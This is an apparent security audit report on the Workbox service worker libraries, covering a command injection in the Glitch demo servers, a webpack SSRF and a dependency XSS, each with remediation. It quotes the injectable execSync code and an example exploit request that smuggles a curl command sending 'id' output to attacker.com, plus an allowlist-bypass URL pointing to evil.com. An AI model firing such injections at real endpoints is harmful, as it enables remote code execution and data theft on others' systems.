CVE-Eligible

Workbox is a suite of JavaScript service worker libraries (published to npm as workbox-* packages) plus build tools like workbox-webpack-plugin. The repository contains no server-side application code — the published library packages operate in the browser/service-worker context, not on a server. The most significant finding is a command injection vulnerability in Glitch demo server code (demos/src/workbox-streams/server.js and demos/src/workbox-cacheable-response/server.js) where a user-supplied repo query parameter is passed unsanitized to execSync(). These servers are confirmed deployed to Glitch.com as live demos. Exploitation requires knowledge of a SECRET environment variable, but the structural vulnerability is clearly present. The npm-published library packages themselves contain no server-side injection risks. The 77 npm advisory entries are dominated by devDependency build tools (lerna, rollup, mocha) that do not reach end-users. No hardcoded secrets were found.

Confirmed Vulnerabilities

WORKBOX-001 Command Injection in Glitch Demo Servers via Unsanitized repo Parameter HIGH
Components: demos/src/workbox-streams/server.js, demos/src/workbox-cacheable-response/server.js Deployed at: glitch.com/@philkrie/workbox-demos Auth Required: Yes (SECRET env var must be known) CWE: CWE-78 (OS Command Injection)

Description

Both demo server scripts contain a /deploy POST endpoint that is documented as "unrelated to the demo and used for maintenance." After checking a secret against process.env.SECRET, the endpoint takes a repo query parameter and passes it directly to execSync() in a shell command string via template literal interpolation. There is no sanitization, validation, or escaping of the repoUrl value. An attacker who knows the SECRET value (stored as a Glitch environment variable) can inject arbitrary shell commands by crafting a repo value containing semicolons, backticks, or $() subshell syntax.

Vulnerable Code

// demos/src/workbox-streams/server.js (identical pattern in workbox-cacheable-response)
app.post('/deploy', (request, response) => {
  if (request.query.secret !== process.env.SECRET) {
    response.status(401).send();
    return;
  }

  const repoUrl = request.query.repo;   // ← ATTACKER-CONTROLLED
  execSync(
    `git checkout -- ./ && git pull -X theirs ${repoUrl} ` +  // ← INJECTION SINK
      `glitch && refresh && git branch -D glitch`,
  );
  response.status(200).send();
});

Example Exploitation

POST https://workbox-streams.glitch.me/deploy?secret=<KNOWN_SECRET>&repo=x;curl+https://attacker.com/$(id);echo
# → execSync runs: git checkout -- ./ && git pull -X theirs x;curl https://attacker.com/$(id);echo glitch...
# → Arbitrary command execution on the Glitch container

Exploitability Gate

(1) Attacker-controlled: Yes — request.query.repo is unsanitized user input.
(2) No sanitization: Confirmed — no escaping, validation, or allowlisting of repo URL format.
(3) Reachable: Yes — the Glitch projects are publicly listed and the endpoint is HTTP-accessible.
(4) Real impact: Remote code execution on the Glitch container hosting the demo; potential exposure of other Glitch env vars (API keys, etc.).
(5) Not framework-mitigated: execSync with shell=true (default) interprets the full string through /bin/sh.

Remediation

Replace the template literal string concatenation with an array-based execFileSync call that separates the command from its arguments, preventing shell interpretation:
execFileSync('git', ['pull', '-X', 'theirs', repoUrl, 'glitch']);
Additionally, validate that repoUrl matches an expected git URL pattern before executing. The refresh command appearing in the same string also warrants review.

WORKBOX-002 webpack buildHttp SSRF via allowedUris Bypass (Build-time) MEDIUM
Component: workbox-webpack-plugin (peerDependency: webpack) Advisory: webpack buildHttp allowedUris allow-list bypass via URL userinfo Severity: HIGH (npm) / MEDIUM here (build-time, requires attacker-controlled webpack config) CWE: CWE-918

Description

The workbox-webpack-plugin package lists webpack@^4.4.0 || ^5.91.0 as a peer dependency. Webpack 4/5 contains a vulnerability where the buildHttp feature's allowedUris allowlist can be bypassed by including userinfo in the URL (e.g., http://allowed.com@evil.com/path), enabling build-time SSRF. This only applies when a developer uses the buildHttp webpack configuration option with an allowlist — it does not affect the typical use of workbox-webpack-plugin for service worker generation.

Remediation

Update the resolved webpack version to one that fixes this bypass. The workbox-webpack-plugin peerDep range ^5.91.0 should be updated to require a minimum version that includes the fix.

WORKBOX-003 serialize-javascript XSS in Build Tool Chain (devDependency) LOW
Component: serialize-javascript (transitive via terser-webpack-plugin) Advisory: Cross-site Scripting (XSS) in serialize-javascript Severity: HIGH (npm) / LOW here (devDependency build tool, not in published library) CWE: CWE-79

Description

serialize-javascript contains an XSS vulnerability via inadequate escaping of certain characters in serialized output. It is a transitive dependency of the build toolchain (via terser-webpack-plugin). This vulnerability does not affect the published workbox library packages or their consumers — it only affects developers building the workbox library itself.

Remediation

Update terser-webpack-plugin to a version that pulls in a fixed serialize-javascript.
